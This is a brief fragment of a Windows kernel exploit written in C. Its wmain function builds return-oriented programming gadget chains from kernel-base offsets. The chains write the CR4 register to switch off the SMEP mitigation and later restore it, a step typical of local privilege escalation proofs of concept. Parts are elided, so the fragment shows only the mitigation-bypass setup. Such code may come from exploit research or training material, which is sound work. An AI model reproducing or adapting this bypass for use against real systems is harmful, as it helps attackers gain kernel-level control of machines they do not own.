...
int wmain(int argc, wchar_t* argv[])
{
	...
	DisableSMEP.PopRcxRet = pKernelBase + 0xe37a;
	DisableSMEP.Cr4RegValue = (PUCHAR)0x506f8;
	DisableSMEP.MovCr4EcxRet = pKernelBase + 0x3ec04;

	EnableSMEP.PopRcxRet = pKernelBase + 0xe37a;
	EnableSMEP.Cr4RegValue = (PUCHAR)0x1506f8;
	EnableSMEP.MovCr4EcxRet = pKernelBase + 0x3ec04;
